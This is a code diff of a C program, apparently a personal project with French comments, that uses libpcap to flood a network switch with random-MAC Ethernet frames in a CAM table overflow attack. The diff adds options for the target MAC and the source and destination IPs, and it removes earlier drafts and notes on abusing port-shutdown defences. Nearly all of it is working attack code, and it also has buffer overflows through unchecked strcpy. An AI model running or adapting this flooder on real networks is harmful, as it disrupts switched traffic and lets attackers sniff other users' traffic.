@@ -1,15 +1,20 @@
-#include <linux/if_ether.h> // https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/if_ether.h importé par la ligne ci-dessous
-#include <net/ethernet.h> // https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/net/ethernet.h.html
+#include <linux/if_ether.h> 
+#include <net/ethernet.h> 
 #include <pcap/pcap.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <netinet/ether.h> // je crois qu'il importe les deux premiers... mais tant pis
+#include <netinet/ether.h>
 #include <sys/socket.h>
-#include <pcap.h> // https://linux.die.net/man/3/pcap_sendpacket
-#include <netinet/ip.h> // to create payloads to my ethernet packets
+#include <pcap.h>
+#include <netinet/ip.h> 
 
 #define ETHER_HEADER_LEN 14
+
+// Function to convert MAC address string to u_char[6] array
+void stringToMac(const char *macStr, u_char *mac) {
+    sscanf(macStr, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+}
 
 void generate_random_mac(u_char *mac_addr) {
     // sends a 8 bit number back that will have to be converted to a mac_address automatically as ether_header takes as types u_char
@@ -19,42 +24,11 @@ void generate_random_mac(u_char *mac_addr) {
     // FIXME : mac addresses to be accepted by the interfaces must validate certain conditions so as they are recognized as being made by a constructor
 }
 
-
-//void generate_random_ip(char *ip_addr) {
-//    // Generate a random IP address as 4 strings
-//    // to be more reliable and accepted advertise that you have a random ip address and that you want to converse with a random ip
-//    for (int i = 0 ; i < 4; i++) {
-//        sprintf(&ip_addr[i], "%d",  rand() % 256);
-//    }
-//}
-
-void generate_random_ip_v1(char *ip_addr) {
-    // Generate a random IP address as a string
-    for (int i = 0; i < 3; i++) {
-        sprintf(&ip_addr[i * 4], "%d", rand() % 256); // Write each octet to the appropriate position in the IP address string
-        strcat(&ip_addr[i * 4], "."); // Add a dot separator between octets
-    }
-    sprintf(&ip_addr[12], "%d", rand() % 256); // Write the last octet
-}
-
-void generate_random_ip_v2(char *ip_addr) {
-    // Generate a random IP address as 4 strings
-    for (int i = 0 ; i < 4; i++) {
-        sprintf(&ip_addr[i * 4], "%d", rand() % 256); // Offset the write position by 4 bytes per iteration
-        printf("ip_addr' %d: %s \n", i, ip_addr);
-        if (i < 3) {
-            strcat(&ip_addr[i * 4], "."); // Append a period between each byte except the last one
-            printf("ip_addr %d: %s \n", i, ip_addr);
-        }
-    }
-    printf("ip_addr : %s \n", ip_addr);
-}
-
 int generate_random_numbers(){
     return rand() % 256;
 }
 
-void generate_random_ip_v3(char *ip_addr) {
+void generate_random_ip(char *ip_addr) {
     sprintf(ip_addr, "%d.%d.%d.%d", generate_random_numbers(), generate_random_numbers(), generate_random_numbers(), generate_random_numbers());
 }
 
@@ -73,33 +47,8 @@ unsigned short checksum(unsigned short *buf, int len) {
     return (unsigned short)~sum;
 }
 
-void generate_ip_payload_v1(struct ip ip_header) { // from chatGPT reformed to suit my random ip generator
-    // Create an IPv4 header and populate its fields
-    ip_header.ip_hl = 5; // Header length (in 32-bit words)
-    ip_header.ip_v = 4; // IPv4 version
-    ip_header.ip_tos = 0; // Type of Service
-    ip_header.ip_len = htons(sizeof(struct ip)); // Total length (in bytes)
-    ip_header.ip_id = htons(12345); // Identification
-    ip_header.ip_off = 0; // Fragment offset
-    ip_header.ip_ttl = 255; // Time to Live
-    ip_header.ip_p = IPPROTO_TCP; // Protocol (e.g., TCP)
-    ip_header.ip_sum = 0; // Checksum (initialized to 0 for calculation)
-    char ip_add[16]; // Allocate enough space for the string representation of an IPv4 address
-    generate_random_ip_v1(ip_add);
-    printf("ip_src 1 : %s \n", ip_add);
-    ip_header.ip_src.s_addr = inet_addr(ip_add);
-    generate_random_ip_v1(ip_add);
-    printf("ip_dst 1: %s \n", ip_add);
-    ip_header.ip_dst.s_addr = inet_addr(ip_add);
-    
-    //ip_header.ip_src.s_addr = inet_addr(strcat(&ip_add[0], strcat(".", strcat(&ip_add[1], strcat(".", strcat(&ip_add[2], strcat(".", &ip_add[3]))))))); // Source IP address
-    //ip_header.ip_dst.s_addr = inet_addr("192.168.1.1"); // Destination IP address
-    // Calculate and set the IPv4 header checksum
-    ip_header.ip_sum = checksum((unsigned short *)&ip_header, sizeof(struct ip));
 
-}
-
-void generate_ip_payload_v2(struct ip *ip_header) {
+void generate_ip_payload(struct ip *ip_header, char *SRC_IP, char *DST_IP) {
     // Create an IPv4 header and populate its fields
     ip_header->ip_hl = 5; // Header length (in 32-bit words)
     ip_header->ip_v = 4; // IPv4 version
@@ -110,44 +59,46 @@ void generate_ip_payload_v2(struct ip *ip_header) {
     ip_header->ip_ttl = 255; // Time to Live
     ip_header->ip_p = IPPROTO_TCP; // Protocol (e.g., TCP)
     ip_header->ip_sum = 0; // Checksum (initialized to 0 for calculation)
-
-    char ip_src[16]; // Allocate enough space for the string representation of an IPv4 address
-    generate_random_ip_v3(ip_src);
+    char ip_src[15]; 
+    if (strlen(SRC_IP) == 0) {
+        generate_random_ip(ip_src);
+    } else {
+        strcpy(ip_src, SRC_IP);
+    }
     ip_header->ip_src.s_addr = inet_addr(ip_src);
-
-    //printf("ip_src 2: %s \n", ip_src);
-    char ip_dst[16]; // Allocate enough space for the string representation of an IPv4 address
-    generate_random_ip_v3(ip_dst);
+    
+    char ip_dst[15];
+    if (strlen(DST_IP) == 0) {
+        generate_random_ip(ip_dst);
+    } else {
+        strcpy(ip_dst, DST_IP);
+    }
     ip_header->ip_dst.s_addr = inet_addr(ip_dst);
-    //printf("ip_dst 2: %s \n", ip_dst);
+
     // TODO : generate a random trailer (it's what macof does) as a payload but i think what i did is ok. 
     // Calculate and set the IPv4 header checksum
     ip_header->ip_sum = checksum((unsigned short *)ip_header, sizeof(struct ip));
 }
 
 
-void generate_basic_packets(struct ether_header *packet_list, int num_packets) {
+void generate_basic_packets(struct ether_header *packet_list, int num_packets, u_char *THA, int assigned) {
     // to be faster it is best to have all the packets already generated before the beginning of the attack
-    for (int i =  0; i < num_packets ; i ++) {
-        generate_random_mac(packet_list[i].ether_dhost);
+    for (int i = 0; i < num_packets ; i ++) {
+        if (assigned == 1) {
+            for (int j = 0 ; j < ETHER_ADDR_LEN ; j ++) {
+                packet_list[i].ether_dhost[j] = THA[j];
+            }
+        } else {
+            generate_random_mac(packet_list[i].ether_dhost);
+        }
         generate_random_mac(packet_list[i].ether_shost);
         packet_list[i].ether_type=htons(0x0800); // 0x0800 is to use ipv4 payload ; 
         // htons function converts the unsigned short integer hostshort from host byte order to network byte order
-        
-        
     }
 }
 
-void generate_complex_packets_v1(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets) {
-    for (int i = 0; i < num_packets ; i++) {
-        memcpy(eth_frames[i], &packet_list[i], ETHER_HEADER_LEN);
-        struct ip ip_header;
-        generate_ip_payload_v1(ip_header);
-        memcpy(eth_frames[i] + ETHER_HEADER_LEN, &ip_header, sizeof(struct ip));
-    }
-}
 
-void generate_complex_packets_v2(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets) {
+void generate_complex_packets(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets, char *SRC_IP, char *DST_IP) {
     for (int i = 0; i < num_packets; i++) {
         memcpy(eth_frames[i], &packet_list[i], ETHER_HEADER_LEN);
         
@@ -162,7 +113,7 @@ void generate_complex_packets_v2(struct ether_header *packet_list, unsigned char
         }
 
         // Generate the IP payload and populate the IP header
-        generate_ip_payload_v2(ip_header);
+        generate_ip_payload(ip_header, SRC_IP, DST_IP);
 
         // Copy the IP header into the Ethernet frame buffer
         memcpy(eth_frames[i] + ETHER_HEADER_LEN, ip_header, sizeof(struct ip));
@@ -193,31 +144,14 @@ void cam_complex_overflow(unsigned char **eth_frames, int num_packets, char *INT
     pcap_close(handle);
 }
 
-void cam_overflow(struct ether_header *packet_list, int num_packets, char *INTERFACE) {
-    pcap_t *handle;
-    char errbuf[PCAP_ERRBUF_SIZE];
-    handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf); // https://github.com/the-tcpdump-group/libpcap/issues/1117 seems better with non local devices
-    if (handle == NULL) {
-        fprintf(stderr, "Couldn't open device %s: %s\n", INTERFACE, errbuf);
-        exit(EXIT_FAILURE); // as the handle was not opened
-    }
-
-    for (int i = 0 ; i < num_packets ; i++) {
-        // seems that the packets are malformed as there is no ip payload (wireshark tells me they are malformed)
-        if (pcap_sendpacket(handle, (const u_char *)&packet_list[i], sizeof(struct ether_header)) != 0) {
-            printf("The switch has killed our port\n");
-            exit(EXIT_FAILURE);
-        } // from chatGPT
-    }
-    pcap_close(handle);
-}
-
-// https://www.frameip.com/attaque-protection-switch-commutateur-ethernet/
 
 int main(int argc, char *argv[]) {
     //printf("started\n");
     int PACKET_COUNT = 10000; // default values
     char *INTERFACE = "eth0"; // default values
+    char SRC_IP[15];
+    char DST_IP[15];
+    u_char THA[ETHER_ADDR_LEN] = {0};
     // TODO : search for all the interfaces that could seem like internet but have weird names (zB  : enps) instead of fixing it to eth0 
         if (argc > 1) {
         if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
@@ -228,6 +162,10 @@ int main(int argc, char *argv[]) {
             printf("  -h, --help        Display this help message\n");
             printf("  -n, --number      Number of packets to send\n");
             printf("  -i, --interface   Interface on which to do the attack\n");
+            printf("  -s, --src         Specify source IP address\n");
+            printf("  -d, --dst         Specify destination IP address\n");
+            printf("  -e, --target      Specify taget mac address\n");
+
             return 0;
         }
         for (int i = 1; i < argc ; i++){
@@ -237,10 +175,20 @@ int main(int argc, char *argv[]) {
             } else if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interface") == 0) {
                 INTERFACE = argv[i+1];
                 i++;
+            } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--src") == 0) {
+                strcpy(SRC_IP, argv[i+1]);
+                i++;
+            } else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--dst") == 0) {
+                strcpy(DST_IP, argv[i+1]);
+                i++;
+            } else if (strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--target") == 0) {
+                stringToMac(argv[i+1], THA);
+                i++;
             } else {
                 goto usage; // in case of invalid arguments
             }
         }
+        // FIXME : j'ai un problème avec mes src_ip a corriger
     }
     struct ether_header packet_list[PACKET_COUNT];
     struct ip ip_header;
@@ -268,18 +216,18 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    // Allocate memory for each Ethernet frame
-    //for (int i = 0; i < PACKET_COUNT; i++) {
-    //    eth_frames[i] = (unsigned char *)malloc(frame_len);
-    //    if (eth_frames[i] == NULL) {
-    //        // Error handling if malloc fails to allocate memory for a specific frame
-    //        // Print an error message, free previously allocated memory, return an error code, or handle the error in any appropriate way
-    //        return 1;
-    //    }
-    //}
-    generate_basic_packets(packet_list, PACKET_COUNT);
+
+    int assigned = 0;
+    for (int i = 0 ; i < ETHER_ADDR_LEN ; i++) {
+        if (THA[i] != 0) {
+            assigned = 1;
+            break;
+        }
+    }
+
+    generate_basic_packets(packet_list, PACKET_COUNT, THA, assigned);
     //printf("first step ok\n");
-    generate_complex_packets_v2(packet_list, eth_frames, PACKET_COUNT);
+    generate_complex_packets(packet_list, eth_frames, PACKET_COUNT, SRC_IP, DST_IP);
     //printf("second step ok\n");
     //cam_overflow(packet_list, PACKET_COUNT, INTERFACE);
     cam_complex_overflow(eth_frames, PACKET_COUNT, INTERFACE, frame_len);
@@ -290,18 +238,3 @@ int main(int argc, char *argv[]) {
     free(eth_frames);
     return 0;
 }
-
-/*
-from http://web.mit.edu/freebsd/head/sys/net/ethernet.h
-struct ether_header {
-	u_char	ether_dhost[ETHER_ADDR_LEN];
-	u_char	ether_shost[ETHER_ADDR_LEN];
-	u_short	ether_type;
-} __packed;
-
-
-Other switch configurations detect that a L2-flooding attack is in progress (by detecting a flood of packets with "new" source-L2-addresses)over a port, and temporarily disables the port. This, in itself, can be an attack if (can you explain how?)
-if the first switch i use does not implement this defense and the packets i send are transfered to a second switch who does then i am blocking all the trafic between the two switches
-and thus i kill all communication on a much bigger size than expected : all switches must have the same defensive configuration
-
-*/
